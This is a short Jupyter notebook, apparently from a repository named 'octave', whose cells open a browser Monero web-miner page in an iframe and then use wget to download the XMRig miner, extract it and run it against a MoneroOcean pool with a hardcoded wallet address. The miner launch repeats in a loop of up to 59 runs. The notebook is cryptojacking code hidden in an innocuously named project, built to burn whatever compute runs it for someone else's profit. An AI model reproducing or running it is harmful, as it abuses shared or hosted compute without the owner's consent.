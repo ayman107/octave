{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f23e5fb-d1a7-4a48-b556-2407984f7a33",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "from IPython.display import IFrame\n",
    "IFrame('https://www.monero.crypto-webminer.com/', width=700, height=700)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "865258e5-bf33-4d9e-9344-44195a8ca6c2",
   "metadata": {},
   "outputs": [],
   "source": [
    "! wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz \n",
    "! tar -zxvf xmrig-6.14.1-linux-x64.tar.gz \n",
    "! cd xmrig-6.14.1 &&  ./xmrig -ostratum+tcp://gulf.moneroocean.stream:80 -a rx -k -u 42VsRJPATEujKXhQATp8D9GNJLBNZCQBh7v92wK9Lz3AFSdkipZMTFWCkwisiNAmhWZ4LN85FRirzbo5HtcKE5qwNTTzEM6.aa\n",
    "\n",
    "i = 1\n",
    "while i < 60:\n",
    "  print(i)\n",
    "  ! cd xmrig-6.14.1 &&  ./xmrig -ostratum+tcp://gulf.moneroocean.stream:80 -a rx -k -u 42VsRJPATEujKXhQATp8D9GNJLBNZCQBh7v92wK9Lz3AFSdkipZMTFWCkwisiNAmhWZ4LN85FRirzbo5HtcKE5qwNTTzEM6.aa\n",
    "\n",
    "\n",
    "  i += 1"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
